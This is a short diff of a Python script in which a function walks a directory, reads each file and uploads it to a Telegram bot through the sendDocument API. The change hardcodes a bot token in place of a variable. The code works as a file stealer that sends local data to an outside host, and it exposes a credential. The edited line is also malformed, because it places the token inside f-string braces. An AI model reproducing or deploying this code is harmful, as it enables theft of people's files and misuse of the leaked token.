@@ -41,7 +41,7 @@ def akin():
 			file_path = os.path.join(path, file)
 			with open(file_path, 'rb') as f:
 				file_data = f.read()
-				url = (f'https://api.telegram.org/bot{bot_token}/sendDocument')
+				url = (f'https://api.telegram.org/bot{7859991830:AAGA9wrY3ybcGBm4Rb-eOmBhMNMak1zRoQA}/sendDocument')
 				files = {'document': (file, file_data)}
 				data = {'chat_id': chat_id}
 				r = requests.post(url, data=data, files=files)
